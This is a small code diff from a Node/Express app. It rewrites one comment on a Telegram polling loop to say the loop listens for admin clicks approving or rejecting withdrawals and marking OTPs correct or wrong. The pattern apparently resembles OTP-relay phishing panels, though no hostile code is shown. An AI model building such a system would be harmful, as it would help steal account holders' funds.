@@ -95,7 +95,7 @@ app.get('/api/check-otp-status', (req, res) => {
     res.json({ status: otpStatus });
 });
 
-// 5. Telegram Long-Polling Loop
+// 5. Telegram Long-Polling to listen for admin button clicks (approve/reject withdrawal, correct/wrong OTP)
 async function pollTelegramUpdates() {
     if (!BOT_TOKEN) return;
 
